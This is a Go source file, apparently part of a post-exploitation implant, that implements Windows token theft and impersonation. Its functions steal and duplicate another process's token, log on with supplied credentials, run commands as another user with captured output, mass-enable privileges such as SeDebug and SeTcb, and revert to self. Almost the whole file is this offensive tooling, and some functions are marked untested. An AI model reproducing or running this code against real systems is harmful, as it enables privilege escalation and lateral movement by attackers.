package command

import (
	"errors"
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
)

// storage stolen token?
var stolenToken windows.Token
var isTokenValid = false

const (
	TokenPrimary                  = 1
	TokenImpersonation            = 2
	SecurityAnonymous             = 0
	SecurityIdentification        = 1
	SecurityImpersonation         = 2
	SecurityDelegation            = 3
	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT      = 0
	LOGON_WITH_PROFILE            = 0x00000001
)

// get as many privileges as possible
var privileges = []string{"SeAssignPrimaryTokenPrivilege",
	"SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
	"SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege",
	"SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege",
	"SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
	"SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege",
	"SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege",
	"SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege",
	"SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
	"SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege",
	"SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
	"SeUndockPrivilege", "SeUnsolicitedInputPrivilege"}

// always close, no matter it is invalid or not
func closeToken(token windows.Token) error {
	if isTokenValid {
		err := windows.CloseHandle(windows.Handle(token))
		if err != nil {
			return errors.New(fmt.Sprintf("CloseHandle error: %s", err))
		}
		isTokenValid = false
	}
	return nil
}

// TODO check if it works
func RunAs(domain []byte, username []byte, password []byte, cmd []byte) ([]byte, error) {
	lpUsername := windows.StringToUTF16Ptr(string(username))
	lpDomain := windows.StringToUTF16Ptr(string(domain))
	lpPassword := windows.StringToUTF16Ptr(string(password))
	lpCommandLine := windows.StringToUTF16Ptr(string(cmd))
	startUpInfo := &windows.StartupInfo{}
	procInfo := &windows.ProcessInformation{}
	var hWPipe windows.Handle
	var hRPipe windows.Handle
	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: nil,
		InheritHandle:      1, //true
	}

	// create anonymous pipe
	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(hWPipe)
	defer windows.CloseHandle(hRPipe)

	startUpInfo.Flags = windows.STARTF_USESTDHANDLES
	startUpInfo.StdErr = hWPipe
	startUpInfo.StdOutput = hWPipe

	// https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
	// wait for it end and read result
	_, _, err = createProcessWithLogonW.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), 2, 0, uintptr(unsafe.Pointer(lpCommandLine)), 0x04000000, 0, uintptr(unsafe.Pointer(startUpInfo)), uintptr(unsafe.Pointer(procInfo)))
	if err != nil && err != windows.SEVERITY_SUCCESS {
		return nil, err
	}
	defer windows.CloseHandle(procInfo.Process)
	defer windows.CloseHandle(procInfo.Thread)

	_, _ = windows.WaitForSingleObject(procInfo.Process, windows.INFINITE)
	_, _ = windows.WaitForSingleObject(procInfo.Thread, windows.INFINITE)

	buf := make([]byte, 1024*8)
	//var done uint32 = 4096
	var read windows.Overlapped
	_ = windows.ReadFile(hRPipe, buf, nil, &read)

	return buf[:read.InternalHigh], nil
}

func GetPrivs(privs []string) (string, error) {
	result := ""
	// it always returns a invalidHandler?
	p := windows.CurrentProcess()
	var token windows.Token
	err := windows.OpenProcessToken(p, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return result, err
	}
	LUIDs := make([]windows.LUID, len(privs))
	for i, priv := range privs {
		_ = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(priv), &LUIDs[i])
	}

	// use struct can only add one privilege, so just do some black magic
	//var b bytes.Buffer
	//_ = binary.Write(&b, binary.LittleEndian, uint32(len(privs)))
	//for _, p := range privs {
	//	_ = binary.Write(&b, binary.LittleEndian, p)
	//	_ = binary.Write(&b, binary.LittleEndian, windows.SE_PRIVILEGE_ENABLED)
	//}

	// but I need to know which privilege had set, so set one each time

	for i, LUID := range LUIDs {
		var tokenPrivileges windows.Tokenprivileges
		tokenPrivileges.PrivilegeCount = 1
		tokenPrivileges.Privileges[0] = windows.LUIDAndAttributes{
			Luid:       LUID,
			Attributes: windows.SE_PRIVILEGE_ENABLED,
		}
		_, _, err := adjustTokenPrivileges.Call(uintptr(token), 0, uintptr(unsafe.Pointer(&tokenPrivileges)), 0, 0, 0)
		if err != nil {
			if err == windows.ERROR_NOT_ALL_ASSIGNED {
				continue
			} else if err == windows.SEVERITY_SUCCESS {
				result += fmt.Sprintf("%s\n", privs[i])
			} else {
				return result, err
			}
		}
	}
	return result, nil
}

// always remember to release handle
func Rev2self() error {
	_ = closeToken(stolenToken)
	return windows.RevertToSelf()
}

func StealToken(pid uint32) error {
	// getprivs first
	_, _ = GetPrivs(privileges)
	ProcessHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		ProcessHandle, err = windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
		if err != nil {
			return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
		}
	}
	defer windows.CloseHandle(ProcessHandle)
	var token windows.Token
	err = windows.OpenProcessToken(ProcessHandle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &token)
	if err != nil {
		return errors.New(fmt.Sprintf("OpenProcessToken error: %s", err))
	}
	// call always return an error
	_, _, err = impersonateLoggedOnUser.Call(uintptr(token))
	defer windows.CloseHandle(windows.Handle(token))
	if err != nil && err != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("ImpersonateLoggedOnUser error: %s", err))
	}
	// maybe I should close previous token first?
	_ = closeToken(stolenToken)
	err = windows.DuplicateTokenEx(token, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, SecurityImpersonation, TokenPrimary, &stolenToken)
	if err != nil {
		return errors.New(fmt.Sprintf("DuplicateTokenEx error: %s", err))
	}
	isTokenValid = true
	return nil
}

// TODO check if it works
func MakeToken(domain []byte, username []byte, password []byte) error {
	var token windows.Token
	lpUsername := windows.StringToUTF16Ptr(string(username))
	lpDomain := windows.StringToUTF16Ptr(string(domain))
	lpPassword := windows.StringToUTF16Ptr(string(password))
	_, _, err := logonUserA.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, uintptr(token))
	if err != nil && err != windows.SEVERITY_SUCCESS {
		return err
	}
	_, _, err = impersonateLoggedOnUser.Call(uintptr(token))
	if err != nil && err != windows.SEVERITY_SUCCESS {
		return err
	}
	_ = closeToken(stolenToken)
	err = windows.DuplicateTokenEx(token, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, SecurityImpersonation, TokenPrimary, &stolenToken)
	if err != nil {
		return errors.New(fmt.Sprintf("DuplicateTokenEx error: %s", err))
	}
	isTokenValid = true
	return nil
}
